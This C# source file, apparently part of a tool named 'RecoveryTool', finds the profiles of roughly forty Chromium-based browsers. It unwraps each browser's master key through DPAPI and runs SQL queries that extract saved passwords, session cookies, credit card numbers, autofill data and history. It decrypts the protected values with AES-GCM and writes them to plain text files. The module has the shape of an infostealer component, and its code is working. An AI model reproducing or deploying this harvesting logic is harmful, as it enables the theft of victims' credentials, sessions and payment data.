using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Engines;
using RecoveryTool.Recovery.Utilities;
using Org.BouncyCastle.Crypto.Modes;
using System.Security.Cryptography;
using System.Data.SQLite;
using Newtonsoft.Json;
using System.Text;

namespace RecoveryTool.Recovery.Browsers.Chromium
{
    public static class ChromiumCommon
    {
        public static readonly Dictionary<string, string> BrowserDirectories = new()
        {
            {"Chromium", @"Chromium\User Data"},
            {"GoogleChrome", @"Google\Chrome\User Data"},
            {"GoogleChromeSxS", @"Google\Chrome SxS\User Data"},
            {"GoogleChromeBeta", @"Google\Chrome Beta\User Data"},
            {"GoogleChromeDev", @"Google\Chrome Dev\User Data"},
            {"GoogleChromeUnstable", @"Google\Chrome Unstable\User Data"},
            {"GoogleChromeCanary", @"Google\Chrome Canary\User Data"},
            {"Edge", @"Microsoft\Edge\User Data"},
            {"Brave", @"BraveSoftware\Brave-Browser\User Data"},
            {"OperaGX", @"Opera Software\Opera GX Stable"},
            {"Opera", @"Opera Software\Opera Stable"},
            {"OperaNeon", @"Opera Software\Opera Neon\User Data"},
            {"Vivaldi", @"Vivaldi\User Data"},
            {"Blisk", @"Blisk\User Data"},
            {"Epic", @"Epic Privacy Browser\User Data"},
            {"SRWareIron", @"SRWare Iron\User Data"},
            {"ComodoDragon", @"Comodo\Dragon\User Data"},
            {"Yandex", @"Yandex\YandexBrowser\User Data"},
            {"YandexCanary", @"Yandex\YandexBrowserCanary\User Data"},
            {"YandexDeveloper", @"Yandex\YandexBrowserDeveloper\User Data"},
            {"YandexBeta", @"Yandex\YandexBrowserBeta\User Data"},
            {"YandexTech", @"Yandex\YandexBrowserTech\User Data"},
            {"YandexSxS", @"Yandex\YandexBrowserSxS\User Data"},
            {"Slimjet", @"Slimjet\User Data"},
            {"UC", @"UCBrowser\User Data"},
            {"Avast", @"AVAST Software\Browser\User Data"},
            {"CentBrowser", @"CentBrowser\User Data"},
            {"Kinza", @"Kinza\User Data"},
            {"Chedot", @"Chedot\User Data"},
            {"360Browser", @"360Browser\User Data"},
            {"Falkon", @"Falkon\User Data"},
            {"AVG", @"AVG\Browser\User Data"},
            {"CocCoc", @"CocCoc\Browser\User Data"},
            {"Torch", @"Torch\User Data"},
            {"NaverWhale", @"Naver\Whale\User Data"},
            {"Maxthon", @"Maxthon\User Data"},
            {"Iridium", @"Iridium\User Data"},
            {"Puffin", @"CloudMosa\Puffin\User Data"},
            {"Kometa", @"Kometa\User Data"},
            {"Amigo", @"Amigo\User Data"}
        };

        public static readonly Dictionary<string, string> FileNames = new()
        {
            {"Bookmarks", "Bookmarks.txt"},
            {"Passwords", "Passwords.txt"},
            {"Cookies", "Cookies.txt"},
            {"History", "History.txt"},
            {"CreditCards", "CreditCards.txt"},
            {"Autofill", "Autofill.txt"}
        };

        public static readonly Dictionary<string, string> DbQueries = new()
        {
            {"History", "SELECT urls.url, urls.title, urls.visit_count, visits.visit_time FROM urls JOIN visits ON urls.id = visits.url ORDER BY visit_time DESC"},
            {"Passwords", "SELECT origin_url, username_value, password_value FROM logins"},
            {"Cookies", "SELECT host_key, name, encrypted_value, expires_utc FROM cookies"},
            {"CreditCards", "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"},
            {"Autofill", "SELECT name, value, date_created, date_last_used FROM autofill WHERE name IN ('email', 'phone', 'street_address', 'city', 'state', 'zipcode') ORDER BY date_last_used DESC"},
        };

        public static byte[] DecryptData(byte[] key, byte[] cipherText, int nonceOffset = 3, int nonceSize = 12)
        {
            if (cipherText.Length < nonceOffset + nonceSize)
                throw new ArgumentException("Ciphertext is too short or improperly formatted.");

            byte[] nonce = new byte[nonceSize];
            Array.Copy(cipherText, nonceOffset, nonce, 0, nonceSize);

            int encryptedDataSize = cipherText.Length - nonceOffset - nonceSize;
            byte[] encryptedData = new byte[encryptedDataSize];
            Array.Copy(cipherText, nonceOffset + nonceSize, encryptedData, 0, encryptedDataSize);

            GcmBlockCipher cipher = new(new AesEngine());
            AeadParameters parameters = new(new KeyParameter(key), 128, nonce);

            cipher.Init(false, parameters);
            byte[] plaintext = new byte[cipher.GetOutputSize(encryptedData.Length)];
            int len = cipher.ProcessBytes(encryptedData, 0, encryptedData.Length, plaintext, 0);
            cipher.DoFinal(plaintext, len);

            return plaintext;
        }

        public static string DecryptChromium(byte[] passwordBlob, byte[] key)
        {
            if (passwordBlob == null || passwordBlob.Length <= 15 || key == null)
                return string.Empty;

            byte[] decryptedData = DecryptData(key, passwordBlob);
            return Encoding.UTF8.GetString(decryptedData).TrimEnd('\0');
        }

        public static byte[] DecryptWithYandex(byte[] key, byte[] ciphertext)
        {
            return DecryptData(key, ciphertext);
        }

        public static byte[]? GetKey(string browserName)
        {
            string folderPath = BrowserDirectories[browserName].Replace(@"\Default", "");

            Environment.SpecialFolder baseFolder = browserName.StartsWith("Opera") ?
                                                    Environment.SpecialFolder.ApplicationData :
                                                    Environment.SpecialFolder.LocalApplicationData;

            string localStatePath = Path.Combine(Environment.GetFolderPath(baseFolder), folderPath, "Local State");

            if (!File.Exists(localStatePath)) return null;

            var localState = JsonConvert.DeserializeObject<dynamic>(File.ReadAllText(localStatePath));
            string encryptedKeyBase64 = localState.os_crypt.encrypted_key;
            byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64).Skip(5).ToArray();
            byte[] key = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
            return key;
        }

        public static async Task ExecuteSqliteQueryAndProcessResultsAsync(string browserName, string dbName, string query, Func<SQLiteDataReader, Task<string>> resultProcessor, string resultFileName)
        {
            using var reader = await ChromiumRepository.ExecuteSqliteQueryAsync(browserName, dbName, query);
            if (reader == null || !reader.HasRows) return;

            string outputPath = PrepareRecoveryFilePath(browserName, resultFileName);
            Directory.CreateDirectory(Path.GetDirectoryName(outputPath));
            using var sw = new StreamWriter(outputPath, false);
            while (await reader.ReadAsync())
            {
                string resultLine = await resultProcessor(reader);
                await sw.WriteLineAsync(resultLine);
            }
        }

        public static string PrepareRecoveryFilePath(string browserName, string fileName)
        {
            return Common.EnsureBrowsersRecoveryFilePath(browserName, fileName);
        }
    }
}